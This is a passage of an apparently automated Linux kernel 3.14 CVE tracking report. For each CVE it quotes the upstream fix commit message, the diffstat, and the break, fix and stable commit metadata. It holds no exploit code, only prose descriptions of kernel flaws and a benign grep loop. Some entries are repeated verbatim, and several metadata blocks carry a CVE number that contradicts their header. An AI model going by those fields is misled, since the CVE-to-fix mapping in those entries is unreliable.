 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-01-02
CVE: CVE-2014-9428
Break Date: 2013-10-12
Break Commit: 610bfc6bc99bc83680d190ebc69359a05fc7f605
Break Tag: 3.13
Linus Fix Date: 2014-12-23
Linus Commit: 5b6698b0e4a37053de35cc24ee695b98a7eb712b
Linus Tag: 3.19
Stable Date: 2015-01-27
Stable Commit: 73ef2a1c62d46a3260b0bceab99ca7b642f670dc
Stable Tag: 3.14.30

CVE-2014-9529:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.31.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a3a8784454692dd72e5d5d34dcdab17b4420e74c
Author: Sasha Levin <sasha.levin@oracle.com>
Date:   Mon Dec 29 09:39:01 2014 -0500

    KEYS: close race between key lookup and freeing
    
    When a key is being garbage collected, it's key->user would get put before
    the ->destroy() callback is called, where the key is removed from it's
    respective tracking structures.
    
    This leaves a key hanging in a semi-invalid state which leaves a window open
    for a different task to try an access key->user. An example is
    find_keyring_by_name() which would dereference key->user for a key that is
    in the process of being garbage collected (where key->user was freed but
    ->destroy() wasn't called yet - so it's still present in the linked list).
    
    This would cause either a panic, or corrupt memory.
    
    Fixes CVE-2014-9529.
    
    Signed-off-by: Sasha Levin <sasha.levin@oracle.com>
    Signed-off-by: David Howells <dhowells@redhat.com>

 security/keys/gc.c |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-01-09
CVE: CVE-2014-9529
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-01-05
Linus Commit: a3a8784454692dd72e5d5d34dcdab17b4420e74c
Linus Tag: 3.19
Stable Date: 2015-01-29
Stable Commit: cf69173f59163182c12e0ecbda52721397468763
Stable Tag: 3.14.31

CVE-2014-9584:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4e2024624e678f0ebb916e6192bd23c1f9fdf696
Author: Jan Kara <jack@suse.cz>
Date:   Thu Dec 18 17:26:10 2014 +0100

    isofs: Fix unchecked printing of ER records
    
    We didn't check length of rock ridge ER records before printing them.
    Thus corrupted isofs image can cause us to access and print some memory
    behind the buffer with obvious consequences.
    
    Reported-and-tested-by: Carl Henrik Lunde <chlunde@ping.uio.no>
    CC: stable@vger.kernel.org
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/isofs/rock.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-01-09
CVE: CVE-2014-9584
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-19
Linus Commit: 4e2024624e678f0ebb916e6192bd23c1f9fdf696
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: a3d4f59634f38d5236b182b403df74bbceeac7c9
Stable Tag: 3.14.28

CVE-2014-9585:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.29.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 394f56fe480140877304d342dec46d50dc823d46
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Fri Dec 19 16:04:11 2014 -0800

    x86_64, vdso: Fix the vdso address randomization algorithm
    
    The theory behind vdso randomization is that it's mapped at a random
    offset above the top of the stack.  To avoid wasting a page of
    memory for an extra page table, the vdso isn't supposed to extend
    past the lowest PMD into which it can fit.  Other than that, the
    address should be a uniformly distributed address that meets all of
    the alignment requirements.
    
    The current algorithm is buggy: the vdso has about a 50% probability
    of being at the very end of a PMD.  The current algorithm also has a
    decent chance of failing outright due to incorrect handling of the
    case where the top of the stack is near the top of its PMD.
    
    This fixes the implementation.  The paxtest estimate of vdso
    "randomisation" improves from 11 bits to 18 bits.  (Disclaimer: I
    don't know what the paxtest code is actually calculating.)
    
    It's worth noting that this algorithm is inherently biased: the vdso
    is more likely to end up near the end of its PMD than near the
    beginning.  Ideally we would either nix the PMD sharing requirement
    or jointly randomize the vdso and the stack to reduce the bias.
    
    In the mean time, this is a considerable improvement with basically
    no risk of compatibility issues, since the allowed outputs of the
    algorithm are unchanged.
    
    As an easy test, doing this:
    
    for i in `seq 10000`
      do grep -P vdso /proc/self/maps |cut -d- -f1
    done |sort |uniq -d
    
    used to produce lots of output (1445 lines on my most recent run).
    A tiny subset looks like this:
    
    7fffdfffe000
    7fffe01fe000
    7fffe05fe000
    7fffe07fe000
    7fffe09fe000
    7fffe0bfe000
    7fffe0dfe000
    
    Note the suspicious fe000 endings.  With the fix, I get a much more
    palatable 76 repeated addresses.
    
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Cc: stable@vger.kernel.org
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>

 arch/x86/vdso/vma.c |   45 +++++++++++++++++++++++++++++----------------
 1 file changed, 29 insertions(+), 16 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-01-09
CVE: CVE-2014-9585
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-20
Linus Commit: 394f56fe480140877304d342dec46d50dc823d46
Linus Tag: 3.19
Stable Date: 2015-01-16
Stable Commit: 67ff8e53620c9aa941a7e4abbbfd921b0c4f97f0
Stable Tag: 3.14.29

CVE-2014-9644:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.31.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4943ba16bbc2db05115707b3ff7b4874e9e3c560
Author: Kees Cook <keescook@chromium.org>
Date:   Mon Nov 24 16:32:38 2014 -0800

    crypto: include crypto- module prefix in template
    
    This adds the module loading prefix "crypto-" to the template lookup
    as well.
    
    For example, attempting to load 'vfat(blowfish)' via AF_ALG now correctly
    includes the "crypto-" prefix at every level, correctly rejecting "vfat":
    
    	net-pf-38
    	algif-hash
    	crypto-vfat(blowfish)
    	crypto-vfat(blowfish)-all
    	crypto-vfat
    
    Reported-by: Mathias Krause <minipli@googlemail.com>
    Signed-off-by: Kees Cook <keescook@chromium.org>
    Acked-by: Mathias Krause <minipli@googlemail.com>
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 arch/x86/crypto/fpu.c |    3 +++
 crypto/algapi.c       |    4 ++--
 crypto/authenc.c      |    1 +
 crypto/authencesn.c   |    1 +
 crypto/cbc.c          |    1 +
 crypto/ccm.c          |    1 +
 crypto/chainiv.c      |    1 +
 crypto/cmac.c         |    1 +
 crypto/cryptd.c       |    1 +
 crypto/ctr.c          |    1 +
 crypto/cts.c          |    1 +
 crypto/ecb.c          |    1 +
 crypto/eseqiv.c       |    1 +
 crypto/gcm.c          |    1 +
 crypto/hmac.c         |    1 +
 crypto/lrw.c          |    1 +
 crypto/mcryptd.c      |    1 +
 crypto/pcbc.c         |    1 +
 crypto/pcrypt.c       |    1 +
 crypto/seqiv.c        |    1 +
 crypto/vmac.c         |    1 +
 crypto/xcbc.c         |    1 +
 crypto/xts.c          |    1 +
 23 files changed, 26 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-02
CVE: CVE-2014-9644
Break Date: 2010-11-19
Break Commit: 03c8efc1ffeb6b82a22c1af8dd908af349563314
Break Tag: 2.6
Linus Fix Date: 2014-11-26
Linus Commit: 4943ba16bbc2db05115707b3ff7b4874e9e3c560
Linus Tag: 3.19
Stable Date: 2015-01-29
Stable Commit: f6e8b55035cb1cc1b6ac054fbfed633177524362
Stable Tag: 3.14.31

CVE-2014-9683:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 942080643bce061c3dd9d5718d3b745dcb39a8bc
Author: Michael Halcrow <mhalcrow@google.com>
Date:   Wed Nov 26 09:09:16 2014 -0800

    eCryptfs: Remove buggy and unnecessary write in file name decode routine
    
    Dmitry Chernenkov used KASAN to discover that eCryptfs writes past the
    end of the allocated buffer during encrypted filename decoding. This
    fix corrects the issue by getting rid of the unnecessary 0 write when
    the current bit offset is 2.
    
    Signed-off-by: Michael Halcrow <mhalcrow@google.com>
    Reported-by: Dmitry Chernenkov <dmitryc@google.com>
    Suggested-by: Kees Cook <keescook@chromium.org>
    Cc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions
    Signed-off-by: Tyler Hicks <tyhicks@canonical.com>

 fs/ecryptfs/crypto.c |    1 -
 1 file changed, 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-03
CVE: CVE-2014-9683
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-11-26
Linus Commit: 942080643bce061c3dd9d5718d3b745dcb39a8bc
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: a306ae6aaca17d46f63143c0c8a5f1c9cfe75b4b
Stable Tag: 3.14.28

CVE-2014-9710:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.47.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 5f5bc6b1e2d5a6f827bc860ef2dc5b6f365d1339
Author: Filipe Manana <fdmanana@suse.com>
Date:   Sun Nov 9 08:38:39 2014 +0000

    Btrfs: make xattr replace operations atomic
    
    Replacing a xattr consists of doing a lookup for its existing value, delete
    the current value from the respective leaf, release the search path and then
    finally insert the new value. This leaves a time window where readers (getxattr,
    listxattrs) won't see any value for the xattr. Xattrs are used to store ACLs,
    so this has security implications.
    
    This change also fixes 2 other existing issues which were:
    
    *) Deleting the old xattr value without verifying first if the new xattr will
       fit in the existing leaf item (in case multiple xattrs are packed in the
       same item due to name hash collision);
    
    *) Returning -EEXIST when the flag XATTR_CREATE is given and the xattr doesn't
       exist but we have have an existing item that packs muliple xattrs with
       the same name hash as the input xattr. In this case we should return ENOSPC.
    
    A test case for xfstests follows soon.
    
    Thanks to Alexandre Oliva for reporting the non-atomicity of the xattr replace
    implementation.
    
    Reported-by: Alexandre Oliva <oliva@gnu.org>
    Signed-off-by: Filipe Manana <fdmanana@suse.com>
    Signed-off-by: Chris Mason <clm@fb.com>

 fs/btrfs/ctree.c    |    2 +-
 fs/btrfs/ctree.h    |    5 ++
 fs/btrfs/dir-item.c |   10 ++--
 fs/btrfs/xattr.c    |  150 +++++++++++++++++++++++++++++++--------------------
 4 files changed, 102 insertions(+), 65 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-05-27
CVE: CVE-2014-9710
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-11-20
Linus Commit: 5f5bc6b1e2d5a6f827bc860ef2dc5b6f365d1339
Linus Tag: 3.19
Stable Date: 2015-07-03
Stable Commit: 02590fd855d1690568b2fa439c942e933221b57a
Stable Tag: 3.14.47

CVE-2014-9715:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.5.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 223b02d923ecd7c84cf9780bb3686f455d279279
Author: Andrey Vagin <avagin@openvz.org>
Date:   Fri Mar 28 13:54:32 2014 +0400

    netfilter: nf_conntrack: reserve two bytes for nf_ct_ext->len
    
    "len" contains sizeof(nf_ct_ext) and size of extensions. In a worst
    case it can contain all extensions. Bellow you can find sizes for all
    types of extensions. Their sum is definitely bigger than 256.
    
    nf_ct_ext_types[0]->len = 24
    nf_ct_ext_types[1]->len = 32
    nf_ct_ext_types[2]->len = 24
    nf_ct_ext_types[3]->len = 32
    nf_ct_ext_types[4]->len = 152
    nf_ct_ext_types[5]->len = 2
    nf_ct_ext_types[6]->len = 16
    nf_ct_ext_types[7]->len = 8
    
    I have seen "len" up to 280 and my host has crashes w/o this patch.
    
    The right way to fix this problem is reducing the size of the ecache
    extension (4) and Florian is going to do this, but these changes will
    be quite large to be appropriate for a stable tree.
    
    Fixes: 5b423f6a40a0 (netfilter: nf_conntrack: fix racy timer handling with reliable)
    Cc: Pablo Neira Ayuso <pablo@netfilter.org>
    Cc: Patrick McHardy <kaber@trash.net>
    Cc: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu>
    Cc: "David S. Miller" <davem@davemloft.net>
    Signed-off-by: Andrey Vagin <avagin@openvz.org>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 include/net/netfilter/nf_conntrack_extend.h |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-05-27
CVE: CVE-2014-9715
Break Date: 2012-08-31
Break Commit: 5b423f6a40a0327f9d40bc8b97ce9be266f74368
Break Tag: 3.6
Linus Fix Date: 2014-04-03
Linus Commit: 223b02d923ecd7c84cf9780bb3686f455d279279
Linus Tag: 3.15
Stable Date: 2014-05-31
Stable Commit: 7a6f558b35e2b196eca1d40b48d37e8bcdc73d19
Stable Tag: 3.14.5

CVE-2014-9717:
CVE-2015-4176:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit e0c9c0afd2fc958ffa34b697972721d81df8a56f
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Wed Apr 1 18:30:06 2015 -0500

    mnt: Update detach_mounts to leave mounts connected
    
    Now that it is possible to lazily unmount an entire mount tree and
    leave the individual mounts connected to each other add a new flag
    UMOUNT_CONNECTED to umount_tree to force this behavior and use
    this flag in detach_mounts.
    
    This closes a bug where the deletion of a file or directory could
    trigger an unmount and reveal data under a mount point.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/namespace.c |    8 ++++++--
 1 file changed, 6 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2014-9717
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-04-09
Linus Commit: e0c9c0afd2fc958ffa34b697972721d81df8a56f
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-9728:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a1d47b262952a45aae62bd49cfaf33dd76c11a2c
Author: Jan Kara <jack@suse.cz>
Date:   Fri Dec 19 12:21:47 2014 +0100

    udf: Verify symlink size before loading it
    
    UDF specification allows arbitrarily large symlinks. However we support
    only symlinks at most one block large. Check the length of the symlink
    so that we don't access memory beyond end of the symlink block.
    
    CC: stable@vger.kernel.org
    Reported-by: Carl Henrik Lunde <chlunde@gmail.com>
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/symlink.c |   17 +++++++++++++----
 1 file changed, 13 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2014-9728
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-19
Linus Commit: a1d47b262952a45aae62bd49cfaf33dd76c11a2c
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: 5c90d036281629fc55ea46d063d4a7c3c10b02d6
Stable Tag: 3.14.28

CVE-2014-9728:
CVE-2014-9729:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit e159332b9af4b04d882dbcfe1bb0117f0a6d4b58
Author: Jan Kara <jack@suse.cz>
Date:   Fri Dec 19 12:03:53 2014 +0100

    udf: Verify i_size when loading inode
    
    Verify that inode size is sane when loading inode with data stored in
    ICB. Otherwise we may get confused later when working with the inode and
    inode size is too big.
    
    CC: stable@vger.kernel.org
    Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no>
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/inode.c |   14 ++++++++++++++
 1 file changed, 14 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2014-9728
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-19
Linus Commit: e159332b9af4b04d882dbcfe1bb0117f0a6d4b58
Linus Tag: 3.19
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-9728:
CVE-2014-9730:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit e237ec37ec154564f8690c5bd1795339955eeef9
Author: Jan Kara <jack@suse.cz>
Date:   Fri Dec 19 14:27:55 2014 +0100

    udf: Check component length before reading it
    
    Check that length specified in a component of a symlink fits in the
    input buffer we are reading. Also properly ignore component length for
    component types that do not use it. Otherwise we read memory after end
    of buffer for corrupted udf image.
    
    Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no>
    CC: stable@vger.kernel.org
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/symlink.c |    9 +++++++--
 1 file changed, 7 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2014-9728
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-21
Linus Commit: e237ec37ec154564f8690c5bd1795339955eeef9
Linus Tag: 3.19
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-9728:
CVE-2014-9729:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit e159332b9af4b04d882dbcfe1bb0117f0a6d4b58
Author: Jan Kara <jack@suse.cz>
Date:   Fri Dec 19 12:03:53 2014 +0100

    udf: Verify i_size when loading inode
    
    Verify that inode size is sane when loading inode with data stored in
    ICB. Otherwise we may get confused later when working with the inode and
    inode size is too big.
    
    CC: stable@vger.kernel.org
    Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no>
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/inode.c |   14 ++++++++++++++
 1 file changed, 14 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2014-9728
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-19
Linus Commit: e159332b9af4b04d882dbcfe1bb0117f0a6d4b58
Linus Tag: 3.19
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-9728:
CVE-2014-9730:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit e237ec37ec154564f8690c5bd1795339955eeef9
Author: Jan Kara <jack@suse.cz>
Date:   Fri Dec 19 14:27:55 2014 +0100

    udf: Check component length before reading it
    
    Check that length specified in a component of a symlink fits in the
    input buffer we are reading. Also properly ignore component length for
    component types that do not use it. Otherwise we read memory after end
    of buffer for corrupted udf image.
    
    Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no>
    CC: stable@vger.kernel.org
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/symlink.c |    9 +++++++--
 1 file changed, 7 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2014-9728
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-21
Linus Commit: e237ec37ec154564f8690c5bd1795339955eeef9
Linus Tag: 3.19
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-9731:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 0e5cc9a40ada6046e6bc3bdfcd0c0d7e4b706b14
Author: Jan Kara <jack@suse.cz>
Date:   Thu Dec 18 22:37:50 2014 +0100

    udf: Check path length when reading symlink
    
    Symlink reading code does not check whether the resulting path fits into
    the page provided by the generic code. This isn't as easy as just
    checking the symlink size because of various encoding conversions we
    perform on path. So we have to check whether there is still enough space
    in the buffer on the fly.
    
    CC: stable@vger.kernel.org
    Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no>
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/dir.c     |    3 ++-
 fs/udf/namei.c   |    3 ++-
 fs/udf/symlink.c |   31 ++++++++++++++++++++++++++-----
 fs/udf/udfdecl.h |    3 ++-
 fs/udf/unicode.c |   28 ++++++++++++++++------------
 5 files changed, 48 insertions(+), 20 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2014-9731
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-19
Linus Commit: 0e5cc9a40ada6046e6bc3bdfcd0c0d7e4b706b14
Linus Tag: 3.19
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-9803:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 5a0fdfada3a2aa50d7b947a2e958bf00cbe0d830
Author: Catalin Marinas <catalin.marinas@arm.com>
Date:   Fri May 16 16:44:32 2014 +0100

    Revert "arm64: Introduce execute-only page access permissions"
    
    This reverts commit bc07c2c6e9ed125d362af0214b6313dca180cb08.
    
    While the aim is increased security for --x memory maps, it does not
    protect against kernel level reads. Until SECCOMP is implemented for
    arm64, revert this patch to avoid giving a false idea of execute-only
    mappings.
    
    Signed-off-by: Catalin Marinas <catalin.marinas@arm.com>

 arch/arm64/include/asm/pgtable.h |   11 +++++------
 arch/arm64/mm/fault.c            |    5 +++--
 2 files changed, 8 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-10
CVE: CVE-2014-9803
Break Date: 2014-05-09
Break Commit: bc07c2c6e9ed125d362af0214b6313dca180cb08
Break Tag: 3.16
Linus Fix Date: 2014-05-16
Linus Commit: 5a0fdfada3a2aa50d7b947a2e958bf00cbe0d830
Linus Tag: 3.16
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-9904:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 6217e5ede23285ddfee10d2e4ba0cc2d4c046205
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Wed Jul 16 09:37:04 2014 +0300

    ALSA: compress: fix an integer overflow check
    
    I previously added an integer overflow check here but looking at it now,
    it's still buggy.
    
    The bug happens in snd_compr_allocate_buffer().  We multiply
    ".fragments" and ".fragment_size" and that doesn't overflow but then we
    save it in an unsigned int so it truncates the high bits away and we
    allocate a smaller than expected size.
    
    Fixes: b35cc8225845 ('ALSA: compress_core: integer overflow in snd_compr_allocate_buffer()')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/compress_offload.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2014-9904
Break Date: 2012-09-14
Break Commit: b35cc8225845112a616e3a2266d2fde5ab13d3ab
Break Tag: 3.7
Linus Fix Date: 2014-07-16
Linus Commit: 6217e5ede23285ddfee10d2e4ba0cc2d4c046205
Linus Tag: 3.17
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-0239:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.40.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f3747379accba8e95d70cec0eae0582c8c182050
Author: Nadav Amit <namit@cs.technion.ac.il>
Date:   Thu Jan 1 23:11:11 2015 +0200

    KVM: x86: SYSENTER emulation is broken
    
    SYSENTER emulation is broken in several ways:
    1. It misses the case of 16-bit code segments completely (CVE-2015-0239).
    2. MSR_IA32_SYSENTER_CS is checked in 64-bit mode incorrectly (bits 0 and 1 can
       still be set without causing #GP).
    3. MSR_IA32_SYSENTER_EIP and MSR_IA32_SYSENTER_ESP are not masked in
       legacy-mode.
    4. There is some unneeded code.
    
    Fix it.
    
    Cc: stable@vger.linux.org
    Signed-off-by: Nadav Amit <namit@cs.technion.ac.il>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/emulate.c |   27 ++++++++-------------------
 1 file changed, 8 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-02
CVE: CVE-2015-0239
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-01-23
Linus Commit: f3747379accba8e95d70cec0eae0582c8c182050
Linus Tag: 3.19
Stable Date: 2015-04-29
Stable Commit: ce5996929f2df50b1e37037a5a78d1269fbb5309
Stable Tag: 3.14.40

CVE-2015-0272:
CVE-2015-8215:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.63.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 77751427a1ff25b27d47a4c36b12c3c8667855ac
Author: Marcelo Leitner <mleitner@redhat.com>
Date:   Mon Feb 23 11:17:13 2015 -0300

    ipv6: addrconf: validate new MTU before applying it
    
    Currently we don't check if the new MTU is valid or not and this allows
    one to configure a smaller than minimum allowed by RFCs or even bigger
    than interface own MTU, which is a problem as it may lead to packet
    drops.
    
    If you have a daemon like NetworkManager running, this may be exploited
    by remote attackers by forging RA packets with an invalid MTU, possibly
    leading to a DoS. (NetworkManager currently only validates for values
    too small, but not for too big ones.)
    
    The fix is just to make sure the new value is valid. That is, between
    IPV6_MIN_MTU and interface's MTU.
    
    Note that similar check is already performed at
    ndisc_router_discovery(), for when kernel itself parses the RA.
    
    Signed-off-by: Marcelo Ricardo Leitner <mleitner@redhat.com>
    Signed-off-by: Sabrina Dubroca <sd@queasysnail.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv6/addrconf.c |   17 ++++++++++++++++-
 1 file changed, 16 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-17
CVE: CVE-2015-0272
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-02-23
Linus Commit: 77751427a1ff25b27d47a4c36b12c3c8667855ac
Linus Tag: 4.0
Stable Date: 2016-03-03
Stable Commit: db449d873870aee9161edb9259d72254987ad7c0
Stable Tag: 3.14.63

CVE-2015-0274:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8275cdd0e7ac550dcce2b3ef6d2fb3b808c1ae59
Author: Dave Chinner <dchinner@redhat.com>
Date:   Tue May 6 07:37:31 2014 +1000

    xfs: remote attribute overwrite causes transaction overrun
    
    Commit e461fcb ("xfs: remote attribute lookups require the value
    length") passes the remote attribute length in the xfs_da_args
    structure on lookup so that CRC calculations and validity checking
    can be performed correctly by related code. This, unfortunately has
    the side effect of changing the args->valuelen parameter in cases
    where it shouldn't.
    
    That is, when we replace a remote attribute, the incoming
    replacement stores the value and length in args->value and
    args->valuelen, but then the lookup which finds the existing remote
    attribute overwrites args->valuelen with the length of the remote
    attribute being replaced. Hence when we go to create the new
    attribute, we create it of the size of the existing remote
    attribute, not the size it is supposed to be. When the new attribute
    is much smaller than the old attribute, this results in a
    transaction overrun and an ASSERT() failure on a debug kernel:
    
    XFS: Assertion failed: tp->t_blk_res_used <= tp->t_blk_res, file: fs/xfs/xfs_trans.c, line: 331
    
    Fix this by keeping the remote attribute value length separate to
    the attribute value length in the xfs_da_args structure. The enables
    us to pass the length of the remote attribute to be removed without
    overwriting the new attribute's length.
    
    Also, ensure that when we save remote block contexts for a later
    rename we zero the original state variables so that we don't confuse
    the state of the attribute to be removes with the state of the new
    attribute that we just added. [Spotted by Brain Foster.]
    
    Signed-off-by: Dave Chinner <dchinner@redhat.com>
    Reviewed-by: Brian Foster <bfoster@redhat.com>
    Signed-off-by: Dave Chinner <david@fromorbit.com>

 fs/xfs/xfs_attr.c        |   24 +++++++++++++++++++++++-
 fs/xfs/xfs_attr_leaf.c   |   21 +++++++++++----------
 fs/xfs/xfs_attr_list.c   |    1 +
